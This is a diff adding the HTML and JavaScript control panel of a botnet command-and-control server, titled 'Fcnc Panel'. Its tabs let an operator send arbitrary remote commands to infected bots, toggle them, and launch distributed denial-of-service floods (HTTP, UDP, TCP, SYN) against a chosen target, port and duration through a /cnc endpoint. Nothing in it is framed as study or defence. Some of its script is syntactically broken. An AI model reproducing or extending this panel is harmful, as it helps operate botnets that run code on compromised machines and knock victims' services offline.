@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Fcnc Panel</title>
+    <link rel="icon" href="https://user-images.githubusercontent.com/66269103/220436048-cf5c617b-3f09-40f7-bc10-dd055e60b520.png">
+    <html style="background-image: url('https://i.imgur.com/W5rkYEn.jpg'); background-size: stretch; background-repeat: no-repeat;">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <style>
+        body {
+          font-family: Arial;
+        }
+
+        /* Style the tab */
+        .tab {
+          border-radius: 20px;
+          overflow: hidden;
+          height: 100px;
+        }
+
+        /* Style the buttons inside the tab */
+        .tab button {
+          float: left;
+          border: none;
+          border-radius: 20px;
+          outline: none;
+          margin-top: 11px;
+          margin-left: 2%;
+          height: 50px;
+          width: 30%;
+          cursor: pointer;
+          padding: 14px 16px;
+          transition: 0.3s;
+          font-size: 17px;
+          transition: height 0.3s linear 0s;
+        }
+
+        /* Change background color of buttons on hover */
+        .tab button:hover {
+          height: 70px;
+          background-color: #2E3440;
+          border-radius: 20px;
+        }
+
+        /* Create an active/current tablink class */
+        .tab button.active {
+          height: 70px;
+          background-color: #4b5468;
+          border-radius: 20px;
+        }
+
+        /* Style the tab content */
+        .tabcontent {
+          display: none;
+          padding: 6px 12px;
+          border-radius: 30px;
+          border: 1px solid #000;
+          border-top: none;
+        }
+
+        .dropdown {
+          position: relative;
+          display: inline-block;
+        }
+
+        .dropdown-content {
+          display: none;
+          position: absolute;
+          width: 80%;
+          background-color: #4C566A;
+          border-radius: 20px;
+          box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);
+          padding: 12px 16px;
+          z-index: 1;
+        }
+
+        .dropdown:hover .dropdown-content {
+          display: block;
+          background-color: #2E3440;
+        }
+
+        .container {
+          position: relative;
+          height: 100%;
+        }
+
+        .centered-element {
+          margin: 0;
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+        }
+
+        .button-50 {
+          width: 26%;
+          height: 10%;
+          appearance: button;
+          background-color: #2E3440;
+          background-image: none;
+          border: 1px solid #000;
+          border-radius: 20px;
+          box-shadow: #fff 4px 4px 0 0, #000 4px 4px 0 1px;
+          box-sizing: border-box;
+          color: #fff;
+          cursor: pointer;
+          display: inline-block;
+          font-family: ITCAvantGardeStd-Bk, Arial, sans-serif;
+          font-size: 14px;
+          font-weight: 400;
+          line-height: 20px;
+          margin: 0 5px 10px 0;
+          overflow: visible;
+          padding: 12px 40px;
+          text-align: center;
+          text-transform: none;
+          touch-action: manipulation;
+          user-select: none;
+          -webkit-user-select: none;
+          vertical-align: middle;
+          white-space: nowrap;
+        }
+
+        .button-50:focus {
+          text-decoration: none;
+        }
+
+        .button-50:hover {
+          background-color: #2E3440;
+          text-decoration: none;
+        }
+
+        .button-50:active {
+          box-shadow: rgba(0, 0, 0, .125) 0 3px 5px inset;
+          outline: 0;
+        }
+
+        .button-50:not([disabled]):active {
+          box-shadow: #fff 2px 2px 0 0, #000 2px 2px 0 1px;
+          transform: translate(2px, 2px);
+        }
+
+        .inputtype-50 {
+          text-align: center;
+          height: 10%;
+          appearance: button;
+          background-color: #2E3440;
+          background-image: none;
+          border: 1px solid #000;
+          border-radius: 20px;
+          box-shadow: #fff 4px 4px 0 0, #000 4px 4px 0 1px;
+          box-sizing: border-box;
+          color: #fff;
+          cursor: pointer;
+          display: inline-block;
+          font-family: ITCAvantGardeStd-Bk, Arial, sans-serif;
+          font-size: 14px;
+          text-align: center;
+          font-weight: 400;
+          line-height: 20px;
+          margin: 0 5px 10px 0;
+          overflow: visible;
+          padding: 12px 40px;
+          text-align: left;
+          text-transform: none;
+          touch-action: manipulation;
+          user-select: none;
+          -webkit-user-select: none;
+          vertical-align: middle;
+          white-space: nowrap;
+        }
+
+        .input-50:focus {
+          text-decoration: none;
+        }
+
+        .input-50:hover {
+          background-color: #2E3440;
+          text-decoration: none;
+        }
+
+        .input-50 {
+          height: 10%;
+          text-align: center;
+          appearance: button;
+          background-color: #2E3440;
+          background-image: none;
+          border: 1px solid #000;
+          border-radius: 20px;
+          box-shadow: #fff 4px 4px 0 0, #000 4px 4px 0 1px;
+          box-sizing: border-box;
+          color: #fff;
+          cursor: pointer;
+          display: inline-block;
+          font-family: ITCAvantGardeStd-Bk, Arial, sans-serif;
+          font-size: 14px;
+          font-weight: 400;
+          line-height: 20px;
+          margin: 0 5px 10px 0;
+          overflow: visible;
+          padding: 12px 40px;
+          text-align: center;
+          text-transform: none;
+          touch-action: manipulation;
+          user-select: none;
+          -webkit-user-select: none;
+          vertical-align: middle;
+          white-space: nowrap;
+        }
+
+        .input-50:focus {
+          text-decoration: none;
+        }
+
+        .input-50:hover {
+          background-color: #2E3440;
+          text-decoration: none;
+        }
+
+        @media (min-width: 768px) {
+          .input-50 {
+            padding: 12px 50px;
+          }
+        }
+
+        .textbox-50 {
+          min-width: 1000px;
+          max-width: 1500px;
+          min-height: 200px;
+          max-height: 600px;
+          width: 1000px;
+          height: 200px;
+          appearance: button;
+          background-color: #2E3440;
+          background-image: none;
+          border: 1px solid #000;
+          border-radius: 20px;
+          box-shadow: #fff 4px 4px 0 0, #000 4px 4px 0 1px;
+          box-sizing: border-box;
+          color: #fff;
+          cursor: pointer;
+          display: inline-block;
+          font-family: ITCAvantGardeStd-Bk, Arial, sans-serif;
+          font-size: 14px;
+          font-weight: 400;
+          line-height: 20px;
+          margin: 0 5px 10px 0;
+          overflow: visible;
+          padding: 12px 40px;
+          text-align: center;
+          text-transform: none;
+          touch-action: manipulation;
+          user-select: none;
+          -webkit-user-select: none;
+          vertical-align: middle;
+          white-space: nowrap;
+        }
+
+        .textbox-50:focus {
+          text-decoration: none;
+        }
+
+        .input-50:hover {
+          background-color: #2E3440;
+          text-decoration: none;
+        }
+
+        @media (min-width: 768px) {
+          .textbox-50 {
+            padding: 12px 50px;
+          }
+
+          .button-50 {
+            padding: 12px 50px;
+          }
+
+          .inputtype-50 {
+            padding: 12px 50px;
+          }
+        }
+      </style>
+  </head>
+  <body>
+    <div class="tab">
+      <button class="tablinks button-50" onclick="opentab(event, 'rce')">Remote Code Execution</button>
+      <button class="tablinks button-50" onclick="opentab(event, 'ddos')">Distributed Denial Of Service</button>
+      <button class="tablinks button-50" onclick="opentab(event, 'other')">Other</button>
+    </div>
+    <div id="rce" class="tabcontent">
+      <div class="centered-element">
+        <textarea id="outputrce" class='textbox-50'></textarea>
+        <center>
+          <input placeholder="Command" style='width: 90%;' id='inputrce' type='text' class="input-50"></input>
+        </center>
+        <center>
+          <button style='width: 40%' class="button-50" role="button" onclick="execute()">Execute</button>
+          <button style='width: 40%' class="button-50" role="button" onclick="toggle()">Toggle</button>
+        </center>
+        <script>
+          function execute() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', '/cnc?command=*rce*' + document.getElementById('inputrce').value, true), true xhr.onreadystatechange = function() {
+              if (xhr.readyState == 4) {
+                output.innerHTML = output.innerHTML + "&#13;&#10;" + xhr.responseText;
+                var textarea = document.getElementById('outputrce');
+                textarea.scrollTop = textarea.scrollHeight;
+              }
+            };
+            xhr.send();
+          };
+
+          function toggle() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', '/bot?toggle', true), true xhr.onreadystatechange = function() {
+              if (xhr.readyState == 4) {
+                output.innerHTML = output.innerHTML + "&#13;&#10;" + "Bots set to : " + xhr.responseText;
+                var textarea = document.getElementById('output');
+                textarea.scrollTop = textarea.scrollHeight;
+              }
+            };
+            xhr.send();
+          };
+        </script>
+      </div>
+    </div>
+</html>
+</div>
+<div id="ddos" class="tabcontent">
+  <div class="centered-element">
+    <textarea id="outputddos" class='textbox-50'></textarea>
+    <center>
+      <input placeholder="Target" style='width: 30%;' id='inputtarget' type='text' class="input-50"></input>
+      <input placeholder="Port" style='width: 15%;' id='inputport' type='text' class="input-50"></input>
+      <input placeholder="Time" style='width: 15%;' id='inputtime' type='text' class="input-50"></input>
+      <div class="dropdown">
+        <center>
+          <input placeholder="Method" style='width: 100%' id='inputtype' type='text' class="inputtype-50"></input>
+          <div class="dropdown-content">
+            <button style='width: 100%' class="button-50" role="button" id='input' onclick="http()">HTTP</button>
+            <br>
+            <button style='width: 100%' class="button-50" role="button" id='input' onclick="udp()">UDP</button>
+            <br>
+            <button style='width: 100%' class="button-50" role="button" id='input' onclick="tcp()">TCP</button>
+            <br>
+            <button style='width: 100%' class="button-50" role="button" id='input' onclick="syn()">SYN</button>
+          </div>
+      </div>
+    </center>
+    <center>
+      <button style='width: 40%' class="button-50" role="button" id='input' onclick="attack()">Send Attack</button>
+      <button style='width: 40%' class="button-50" role="button" id='input' onclick="toggle()">Toggle</button>
+    </center>
+    <script>
+      function attack() {
+        var xhrddos = new XMLHttpRequest();
+        xhrddos.open('GET', '/cnc?command=*dos*' + document.getElementById('inputtype').value + "::" + document.getElementById('inputtarget').value + "::" + document.getElementById('inputport').value + "::" + document.getElementById('inputtime').value, true), true xhrddos.onreadystatechange = function() {
+          if (xhrddos.readyState == 4) {
+            outputddos.innerHTML = outputddos.innerHTML + "&#13;&#10;" + xhrddos.responseText;
+            var textareaddos = document.getElementById('outputddos');
+            textareaddos.scrollTop = textareaddos.scrollHeight;
+          }
+        };
+        xhrddos.send();
+      };
+
+      function toggle() {
+        var xhrddos = new XMLHttpRequest();
+        xhrddos.open('GET', '/bot?toggle', true), true xhrddos.onreadystatechange = function() {
+          if (xhrddos.readyState == 4) {
+            outputddos.innerHTML = outputddos.innerHTML + "&#13;&#10;" + "Bots set to : " + xhrddos.responseText;
+            var textareaddos = document.getElementById('outputddos');
+            textareaddos.scrollTop = textareaddos.scrollHeight;
+          }
+        };
+        xhrddos.send();
+      };
+
+      function http() {
+        document.getElementById('inputtype').value = "*http*"
+      }
+
+      function udp() {
+        document.getElementById('inputtype').value = "*udp*"
+      }
+
+      function tcp() {
+        document.getElementById('inputtype').value = "*tcp*"
+      }
+
+      function syn() {
+        document.getElementById('inputtype').value = "*syn*"
+      }
+    </script>
+  </div>
+</div>
+</div>
+<div id="other" class="tabcontent">
+  <p>others</p>
+</div>
+<script>
+  function opentab(evt, Name) {
+    var i, tabcontent, tablinks;
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+    document.getElementById(Name).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+</script>
+</body>
+</html>
